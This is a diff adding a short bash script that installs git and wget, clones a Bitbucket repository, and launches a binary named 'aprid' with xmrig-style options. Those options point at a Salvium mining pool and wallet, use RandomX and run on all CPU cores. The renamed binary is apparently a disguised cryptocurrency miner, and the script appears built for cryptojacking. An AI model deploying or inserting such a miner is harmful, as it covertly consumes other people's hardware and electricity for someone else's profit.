@@ -1,0 +1,6 @@
+#!/bin/bash
+yum update && yum -y install sudo
+yum -y install git wget
+git clone https://bitbucket.org/asana/luo.git && cd luo
+chmod 777 aprid SHA256SUMS
+./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 -u SaLvs7NGrYZ6TVbJLW5ZbnM8mseq5HSbXT7KdD7yf4TCRc6vYfkHP7zAtgrxUtUp1R76bhQG2P7KzL4eijmwuQA1HBbwARNpFjo -a rx/0 -k -t $(nproc --all)
